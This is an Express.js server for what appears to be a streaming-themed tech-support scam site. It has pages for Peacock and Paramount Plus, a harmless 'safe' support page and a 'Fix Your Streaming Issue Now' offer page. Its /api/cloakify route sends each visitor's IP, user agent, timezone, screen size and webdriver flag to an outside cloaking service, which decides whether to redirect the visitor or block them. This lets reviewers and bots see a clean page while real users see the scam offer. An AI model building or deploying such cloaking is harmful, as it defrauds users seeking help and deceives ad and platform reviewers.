const express = require('express');
const path = require('path');
const https = require('https');
const app = express();

const PORT = process.env.PORT || 5000;

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Homepage
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// /peacock — cloaker entry point
app.get('/peacock', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'peacock.html'));
});

// /api/cloakify — server-side proxy to avoid CORS issues
app.post('/api/cloakify', function(req, res) {
  var chunks = [];
  req.on('data', function(chunk) { chunks.push(chunk); });
  req.on('end', function() {
    var body = Buffer.concat(chunks).toString();
    var parsed = {};
    try { parsed = JSON.parse(body); } catch(e) {}

    var realIP = req.headers['x-forwarded-for']
      ? req.headers['x-forwarded-for'].split(',')[0].trim()
      : req.connection.remoteAddress;

    var realUA = req.headers['user-agent'] || parsed.ua || '';

    var payload = JSON.stringify({
      ua: realUA,
      tz: parsed.tz || '',
      sw: parsed.sw || 0,
      sh: parsed.sh || 0,
      wd: parsed.wd || false,
      pl: parsed.pl || 0,
      mode: 'redirect'
    });

    var https = require('https');
    var options = {
      hostname: 'cloak.codingforfun.me',
      path: '/c/9360998c-9baa-46f1-ae8a-009b647d04e0',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'X-Forwarded-For': realIP,
        'X-Real-IP': realIP,
        'User-Agent': realUA
      }
    };

    var proxyReq = https.request(options, function(proxyRes) {
      var data = '';
      proxyRes.on('data', function(chunk) { data += chunk; });
      proxyRes.on('end', function() {
        try {
          res.json(JSON.parse(data));
        } catch(e) {
          res.json({ decision: 'block' });
        }
      });
    });

    proxyReq.on('error', function() {
      res.json({ decision: 'block' });
    });

    proxyReq.write(payload);
    proxyReq.end();
  });
});

// /safe — Streaming Support & Help landing page
app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

// /offer — Fix Your Streaming Issue Now landing page
app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// Clean URLs - /paramount-plus serves paramount-plus.html
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) {
      res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
    }
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});
